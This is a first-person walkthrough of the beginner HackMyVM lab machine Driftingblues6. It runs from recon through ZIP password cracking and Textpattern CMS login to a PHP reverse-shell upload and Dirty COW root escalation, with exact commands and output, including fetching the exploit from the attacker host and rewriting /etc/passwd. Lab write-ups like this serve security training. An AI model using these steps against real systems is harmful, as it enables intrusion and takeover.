# Driftingblues6

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Driftingblues6 | tasiyanci | Beginner | HackMyVM |

**Summary:** This beginner-level machine features a web application vulnerability chain leading to remote code execution and privilege escalation. The attack path involves discovering a Textpattern CMS login portal, extracting credentials from a password-protected ZIP file, exploiting file upload functionality for initial access, and leveraging the Dirty COW kernel vulnerability for privilege escalation to root.

---

## Reconnaissance

### Network Discovery

First, I performed network discovery to identify the target machine on the local network:

```powershell
PS C:\Windows\System32> arp -a -N 192.168.100.1

Interface: 192.168.100.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.100.22        08-00-27-28-ba-f6     dynamic
```

The target machine was identified at IP address `192.168.100.22`.

### Port Scanning

I conducted a comprehensive port scan using Nmap to identify open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV 192.168.100.22 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 16:50 WIB
Nmap scan report for 192.168.100.22
Host is up (0.0046s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 1 disallowed entry
|_/textpattern/textpattern
```

**Key Findings:**
- Only port 80 (HTTP) is open
- Running Apache HTTP Server 2.2.22 on Debian
- The `robots.txt` file reveals a disallowed entry: `/textpattern/textpattern`

### Web Application Discovery

#### Directory Enumeration

I used Feroxbuster to discover additional web directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.22/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,zip -s 200,301,302,401,403 -t 30

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.22/
 🚩  In-Scope Url          │ 192.168.100.22
 🚀  Threads               │ 30
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302, 401, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      212l     1206w    97264c http://192.168.100.22/db.png
200      GET       76l       75w      750c http://192.168.100.22/index
200      GET       76l       75w      750c http://192.168.100.22/index.html
200      GET      212l     1206w    97264c http://192.168.100.22/db
200      GET        5l       14w      110c http://192.168.100.22/robots
200      GET        5l       14w      110c http://192.168.100.22/robots.txt
200      GET        2l        7w      227c http://192.168.100.22/spammer
200      GET        2l        7w      227c http://192.168.100.22/spammer.zip
```

**Notable Discoveries:**
- `spammer.zip` - A ZIP file that may contain valuable information
- `robots.txt` - Already identified from Nmap scan
- Various image and text files

#### Web Application Analysis

I examined the main web page:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i "192.168.100.22"
HTTP/1.1 200 OK
Date: Thu, 22 Jan 2026 09:50:54 GMT
Server: Apache/2.2.22 (Debian)
Last-Modified: Mon, 15 Mar 2021 13:36:18 GMT
ETag: "36f3-2ee-5bd9355a0d880"
Accept-Ranges: bytes
Content-Length: 750
Vary: Accept-Encoding
Content-Type: text/html
X-Pad: avoid browser bug

<!DOCTYPE html>
<html>
<title>driftingblues</title>
<body class="gbody">
<style>
.gbody {
        background-color: #f4ecd8;
        width: 1000px;
        margin: 40px auto;
        font-family: arial;
        font-size: 20px;
           }

.gempty1 {
        display: inline-block;
        width: 1000px;
        height: 10px;
        border-bottom: solid 1px #000000;
        }

.gempty {
        display: inline-block;
        width: 1000px;
        height: 70px;
        }

</style>
<span class="main1">
<h1>Drifting Blues Tech
<h2>please don't hack
<h2>enough is enough!!!
<br><br><img src="db.png">
</span>
<span class="gempty"></span>
</body>
</html>
<!--

please hack vvmlist.github.io instead
he and their army always hacking us -->
```

The HTML source code contains a hidden comment mentioning "please hack vvmlist.github.io instead", but there is nothing to do with it.

#### Robots.txt Analysis

I examined the robots.txt file for additional clues:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i "192.168.100.22/robots.txt"
HTTP/1.1 200 OK
Date: Thu, 22 Jan 2026 09:52:03 GMT
Server: Apache/2.2.22 (Debian)
Last-Modified: Mon, 15 Mar 2021 19:51:18 GMT
ETag: "3738-6e-5bd9892bb9980"
Accept-Ranges: bytes
Content-Length: 110
Vary: Accept-Encoding
Content-Type: text/plain
X-Pad: avoid browser bug

User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

The robots.txt file provides two crucial pieces of information:
1. A disallowed directory: `/textpattern/textpattern`
2. A hint to look for ZIP files during directory brute-forcing

#### Textpattern CMS Discovery

Following the robots.txt hint, I explored the Textpattern CMS directory:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -i "192.168.100.22/textpattern/textpattern/"
HTTP/1.1 200 OK
Date: Thu, 22 Jan 2026 09:52:40 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.5.38-1~dotdeb+7.1
Set-Cookie: txp_test_cookie=1
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Length: 4553
Content-Type: text/html; charset=utf-8
...
```

This revealed a Textpattern CMS login page, indicating the need for valid credentials to proceed.

![alt text](image-3.png)

## Initial Access

### Credential Discovery

#### ZIP File Analysis

Based on the robots.txt hint and Feroxbuster results, I investigated the `spammer.zip` file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ wget 192.168.100.22/spammer.zip
Prepended http:// to '192.168.100.22/spammer.zip'
--2026-01-22 16:53:55--  http://192.168.100.22/spammer.zip
Connecting to 192.168.100.22:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 179 [application/zip]
Saving to: 'spammer.zip'

spammer.zip      100%[=========>]     179  --.-KB/s    in 0s

2026-01-22 16:53:56 (9.64 MB/s) - 'spammer.zip' saved [179/179]
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ file spammer.zip
spammer.zip: Zip archive data, made by v6.3, extract using at least v2.0, last modified Mar 15 2021 21:46:22, uncompressed size 15, method=store
```

The ZIP file was password-protected:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:
   skipping: creds.txt               incorrect password
```

#### Password Cracking

I used John the Ripper to crack the ZIP password:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ john --show zip
spammer.zip/creds.txt:myspace4:creds.txt:spammer.zip::spammer.zip

1 password hash cracked, 0 left
```

The password was successfully cracked as `myspace4`. I then extracted the credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:
 extracting: creds.txt

┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ cat creds.txt
mayer:lionheart
```

**Credentials found:** `mayer:lionheart`

### Textpattern CMS Authentication

Using the discovered credentials, I successfully logged into the Textpattern CMS admin panel at `http://192.168.100.22/textpattern/textpattern/`.

![alt text](image-4.png)

### Vulnerability Exploitation

#### CMS Version Identification

After gaining access to the admin panel, I identified that the system was running Textpattern CMS version 4.8.3. I searched for known vulnerabilities:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ searchsploit textpattern 4.8.3
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Textpattern 4.8.3 - Remote code execution (Authenticated) (2)      | php/webapps/49620.py
TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)      | php/webapps/48943.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Multiple RCE exploits were available for this version of Textpattern CMS.

#### File Upload Attack

Instead of using the existing exploits, I leveraged the file upload functionality within the CMS. I prepared a PHP reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./reverse-shell.php

┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ vim reverse-shell.php
```

I modified the reverse shell to connect back to my attack machine and uploaded it through the Textpattern file management interface at `http://192.168.100.22/textpattern/textpattern/index.php?event=file`.

![alt text](image-5.png)

#### Reverse Shell Execution

I set up a netcat listener:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

After accessing the uploaded PHP file through the web interface, 

![alt text](image-6.png)

I successfully obtained a reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 54841
www-data@driftingblues:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@driftingblues:/$ uname -a
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

**Initial access achieved:** I gained a shell as the `www-data` user on the target system.

## Privilege Escalation

### System Enumeration

With initial access established, I enumerated the system to identify privilege escalation vectors:

```bash
www-data@driftingblues:/$ uname -a
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

The system was running an older Linux kernel version (3.2.0-4-amd64), which suggested potential kernel-based privilege escalation vulnerabilities.

### Kernel Exploit Research

I searched for kernel exploits targeting this version:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ searchsploit linux kernel 3.2
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
BSD/Linux Kernel 2.3 (BSD/OS 4.0 / FreeBSD 3.2 / NetBSD | bsd/dos/19423.c
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Pr | solaris/local/15962.c
Linux Kernel 2.0/2.1 (Digital UNIX 4.0 D / FreeBSD 2.2. | bsd/dos/19117.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege  | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/ | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem'  | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDAT | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem  | linux/local/40611.c
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - | linux/local/18411.c
Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' L | linux/local/35161.c
Linux Kernel 3.0 < 3.3.5 - 'CLONE_NEWUSER|CLONE_FS' Loc | linux/local/38390.c
...
```

Several Dirty COW exploits were compatible with the target kernel version. I selected the `/etc/passwd` method exploit.

### Dirty COW Exploitation

#### Exploit Preparation

I downloaded the Dirty COW exploit:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ searchsploit -m linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/ouba/driftingblues6/40839.c
```

I set up an HTTP server to transfer the exploit to the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/driftingblues6]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.21.32.1 - - [22/Jan/2026 17:14:41] "GET /40839.c HTTP/1.1" 200 -
```

#### Exploit Execution

On the target machine, I downloaded and compiled the exploit:

```bash
www-data@driftingblues:/tmp$ wget http://192.168.100.1:80/40839.c -O dirty.c
wget http://192.168.100.1:80/40839.c -O dirty.c
--2026-01-22 04:14:39--  http://192.168.100.1/40839.c
Connecting to 192.168.100.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 4,814       --.-K/s   in 0s

2026-01-22 04:14:39 (257 MB/s) - `dirty.c' saved [4814/4814]

www-data@driftingblues:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
```

I verified the current state of `/etc/passwd`:

```bash
www-data@driftingblues:/tmp$ cat /etc/passwd | head -n 1
cat /etc/passwd | head -n 1
root:x:0:0:root:/root:/bin/bash
```

Then executed the Dirty COW exploit:

```bash
www-data@driftingblues:/tmp$ ./dirty password
./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f9f4837d000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

**Privilege escalation successful:** The exploit created a new root-privileged user named `firefart`.

### Root Access

I switched to the newly created privileged user:

```bash
www-data@driftingblues:/tmp$ su - firefart
su - firefart
Password: password

firefart@driftingblues:~# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

**Root access achieved:** I successfully escalated privileges to root (UID 0).

#### Flag Capture

I verified the privilege escalation by checking the modified `/etc/passwd`:

```bash
firefart@driftingblues:~# cat /etc/passwd | head -n 1
cat /etc/passwd | head -n 1
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
```

Finally, I located and captured the flags:

```bash
firefart@driftingblues:~# ls
ls
root.txt  user.txt

firefart@driftingblues:~# cat root.txt; echo; cat user.txt; echo
cat root.txt; echo; cat user.txt; echo
[REDACTED]
[REDACTED]
```